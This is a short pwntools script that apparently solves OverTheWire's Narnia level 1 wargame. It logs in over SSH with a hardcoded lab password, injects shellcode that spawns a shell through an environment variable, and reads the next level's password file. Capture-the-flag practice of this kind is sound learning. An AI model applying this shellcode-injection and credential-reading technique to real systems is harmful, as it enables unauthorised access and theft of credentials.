from pwn import *


con = ssh('narnia1', 'narnia.labs.overthewire.org', password='efeidiedae', port=2226)
context.arch = 'i386'
payload = asm(shellcraft.sh())
p = con.process('/narnia/narnia1', env={'EGG': payload})
p.recv()
p.sendline('cat /etc/narnia_pass/narnia2')
print(p.recvline())
